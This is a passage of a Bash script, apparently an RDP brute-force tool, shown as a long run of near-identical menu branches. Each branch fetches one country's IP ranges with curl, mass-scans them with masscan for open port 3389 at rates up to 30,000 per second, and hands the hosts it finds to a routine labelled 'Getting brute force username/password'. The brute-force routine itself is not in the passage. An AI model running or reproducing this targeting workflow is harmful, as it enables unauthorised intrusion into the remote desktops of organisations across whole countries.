masscan $target -p $port --open-only  --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
fi
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

echo ""
echo -e "$aquamarine                                           Addresses open RDP port:$green"
cat open3389
echo ""
echo -e "Hosts open port 3389 written to the file $red $PWD/open3389$colorbase"
echo ""
sleep 2
clear
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else

if [ "$menuoption" = "2" ]; then
echo -e "$aquamarine*******************************************************************************$green"
read -p "*Enter the path to the file {list.txt,list..& etc.} : " listname

clear
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode $red'CTRL+C'$colorbase"


rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL listname --open-only --max-rate $rate| grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389


trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

echo ""
echo -e "$aquamarine                                           Addresses open RDP port:$green" 
cat open3389
echo ""
echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else

if [ "$menuoption" = "3" ]; then
echo ""
clear
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else
if [ "$menuoption" = "4" ]; then
COUNTRYLIST
trap 'echo ""; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
read -p "                                 Choose the country {1/2/3/& etc.}: " country
clear

echo -e "$aquamarine                                            Get a list of IP"
echo ""
if [ "$country"  = "1" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AFGHANISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Afghanistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"

echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2

echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else

clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""
if [ "$country"  = "2" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ALBANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Albania://g">list
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "3" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ALGERIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Algeria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN




echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"



echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "4" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AMERICAN+SAMOA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/American Samoa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "5" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANDORRA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Andorra://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else

clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "6" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANGOLA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Angola://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "7" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANGUILLA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Anguilla://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "8" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANTIGUA+AND+BARBUDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Antigua and Barbuda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "9" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARGENTINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Argentina://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "10" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARMENIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Armenia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "11" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARUBA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Aruba://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "12" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AUSTRALIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Australia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "13" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AUSTRIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Austria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "14" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AZERBAIJAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Azerbaijan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "15" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BAHAMAS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bahamas://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "16" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BAHRAIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bahrain://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "17" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BANGLADESH |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bangladesh://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
